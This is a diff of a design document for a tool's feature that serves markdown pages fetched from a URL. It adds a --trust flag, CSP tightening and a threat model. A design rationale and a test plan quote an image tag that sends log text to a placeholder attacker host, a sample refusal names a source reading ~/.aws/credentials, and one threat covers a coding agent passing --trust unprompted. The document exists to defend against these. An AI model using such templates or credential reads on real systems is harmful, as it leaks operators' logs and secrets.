@@ -49,7 +49,8 @@ $ tinkerdown serve https://example.com/tool.md
 tool.md declares sources that run commands or read files:
   deploy (exec): ./deploy.sh
   secrets (json): ~/.aws/credentials
-A page from a URL can't use these unless you pass --trust. Pass them as --source flags instead.
+A page from a URL can't use these unless you pass --trust. Pass them as --source flags instead,
+or ask the user before passing --trust.
 ```
 
 A terminal run with no sources:
@@ -69,14 +70,15 @@ Next time, run:
 `tinkerdown serve --help` prints, and exits without serving:
 
 ```
-Usage: tinkerdown serve [directory] [flags]
+Usage: tinkerdown serve [directory | file.md | url] [flags]
 
-Serves the markdown pages in directory (default: current directory).
+Serves the markdown pages in directory (default: current directory), one file, or one page from a URL.
 
 Flags:
   --source NAME=COMMAND    Follow a command's output as stream source NAME (needs --allow-exec)
   --source NAME=file:PATH  Follow a file as stream source NAME
   --allow-exec             Let sources run commands
+  --trust                  Let a page from a URL use its own sources, actions and scripts
   --port N, --host ADDR    Where to listen (default localhost:8080)
   ...
 
@@ -87,6 +89,7 @@ Finding sources to follow:
   journalctl                         -> --source 'journal=journalctl -f -o short-iso'
 
 Without a terminal, serve never prompts: pass every source as a flag.
+Ask the user before passing --trust: it lets a page from a URL run its own commands and read files.
 ```
 
 Without a terminal (an agent, CI, a pipe), `serve` prints the same instructions once, without prompting, and starts. The page then shows its empty state:
@@ -156,6 +159,9 @@ A block whose source is invalid shows the error in place of its content:
 - `serve` prints a fetched page's SHA-256. A URL ending in `#sha256=HEX` is refused when the content doesn't match.
   alternative: none considered
   because: the content behind a URL can change after the user read it
+- A page from a URL is served with a tighter Content-Security-Policy (`img-src 'self' data:`, `form-action 'self'`), and its raw `<script>` elements are refused at startup, unless `--trust` is passed.
+  alternative: rely on the merge-only rule alone
+  because: the page controls its template, so `<img src="https://attacker/?{{.msg}}">` or a script would send the logs from `--source` flags to another site; today's CSP allows `img-src https:`
 - A page from a URL loads no `tinkerdown.yaml` unless `--config` names one.
   because: a page fetched from elsewhere shouldn't pick up whatever config sits in the current directory
 - Prompt answers are not saved. After the prompt, `serve` prints the equivalent `--source` command line.
@@ -163,6 +169,26 @@ A block whose source is invalid shows the error in place of its content:
   because: `serve` shouldn't change files the user didn't ask it to change
 - A block whose source fails to build is sent to the page with its error as `.Error`, rendered by a default error view, instead of being dropped.
   alternative: none considered
+
+## Threat model
+
+The operator (whoever runs `tinkerdown serve`) is trusted: their flags and local config may run commands, with `--allow-exec`. A page from a URL is not trusted. Browsers that reach the server see whatever the page shows, as today.
+
+| # | Threat | Mitigation |
+|---|---|---|
+| T1 | A page from a URL runs commands on the operator's machine | merge-only rule; `--trust` to lift it; commands still need `--allow-exec` |
+| T2 | A page from a URL reads local files (`file:`, `json`/`csv`/`sqlite` paths, includes) | merge-only rule; relative includes don't resolve (G1) |
+| T3 | A page from a URL sends the operator's log rows to another site through its template (images, CSS `url()`, scripts, forms) | tighter CSP for URL pages; raw `<script>` refused; `connect-src 'self'` as today |
+| T4 | The content behind the URL changes after the operator read it | fetched once at startup; `#sha256=` pin; the hash is printed |
+| T5 | The fetch is intercepted | HTTPS only, except HTTP to localhost |
+| T6 | A huge or slow response | 1 MiB cap and a fetch timeout |
+| T7 | Flag or page sources reach an approved merge | `["*"]` expands through `mergeInputLookup` |
+| T8 | A coding agent passes `--trust` because a refusal told it how | the refusal and `serve --help` say to ask the user before `--trust` |
+
+Out of scope:
+- **Links a viewer clicks:** a link in the page's template can carry log text to another site when a viewer clicks it. The CSP can't block navigation, so this is a residual risk, and the docs name it.
+- **Commands in `--source`:** they run with the operator's rights by design, the same as `exec` sources today.
+- **Network exposure:** with `--host`, other machines can read the logs, as with any tinkerdown page today.
 
 ## Files
 
@@ -178,7 +204,8 @@ tinkerdown (worktree `.worktrees/source-flags`):
 - `internal/runtime/state.go`: `Inputs` on `GenericState`.
 - `parser.go`: record `[*] field` as a dynamic tab group.
 - `internal/server/server.go`: expand dynamic tab groups when serving a page.
-- `cmd/tinkerdown/commands/remote_page.go` new?: fetch, size cap, `#sha256=` check, the remote page check and its message.
+- `cmd/tinkerdown/commands/remote_page.go` new?: fetch, size cap, timeout, `#sha256=` check, the remote page check (sources, actions, raw `<script>`) and its message.
+- `internal/server/middleware.go`: the tighter policy from `buildCSP` for a page from a URL.
 - `internal/server/server.go`: serve a single page (`Discover` over one file).
 - `go.mod`: add `golang.org/x/term` for the terminal check.
 - Tests: `source_flags_test.go` new?, `stream_source_e2e_test.go`, `internal/server/source_precedence_test.go`, `parser_test.go`.
@@ -221,10 +248,10 @@ Assumptions (A) are checked before building, risks (R) are what we'd act on, and
 - [ ] The prompt: a test drives it through a pseudo-terminal and checks the printed reuse line; a run with stdin not a terminal doesn't block.
 - [ ] Pages from a URL, tested against an `httptest` server in `cmd/tinkerdown/commands`:
   - a merge-only page serves
-  - a page with an `exec`, `stream` or file-reading source, or an action, is refused without `--trust` and serves with it
+  - a page with an `exec`, `stream` or file-reading source, an action, or a raw `<script>`, is refused without `--trust` and serves with it
   - a `#sha256=` mismatch, a body over 1 MiB and a non-localhost `http://` URL are refused
   - no `tinkerdown.yaml` is read without `--config`
-- [ ] `TestStreamSource_E2E` gains a subtest serving its page from an `httptest` URL with `--source` flags, in Docker Chrome.
+- [ ] `TestStreamSource_E2E` gains a subtest serving its page from an `httptest` URL with `--source` flags, in Docker Chrome. The page's template includes `<img src="http://<other host>/?{{.msg}}">`, and the other host receives no request.
 - [ ] `serve page.md` serves that page at `/` and no other file in its directory.
 - [ ] logviewer: `cd e2e && go test ./...` passes with the demo passed as flags, and `index.md` has no `cmd` or `file`.
 - [ ] Full tinkerdown suite green; pre-commit passes; `prereview check` clean on changed docs.
@@ -235,7 +262,7 @@ Assumptions (A) are checked before building, risks (R) are what we'd act on, and
 - Approved sources stay pinned: no flag, page or `["*"]` expansion reaches into an approved merge.
 - `serve` never waits for input without a terminal.
 - Commands, from any origin, run only with `--allow-exec`.
-- A page from a URL never runs a command or reads a local file through its own frontmatter without `--trust`.
+- A page from a URL never runs a command, reads a local file, or sends data to another origin without `--trust`.
 - e2e tests use real Docker Chrome and are never skipped.
 
 ## Contract
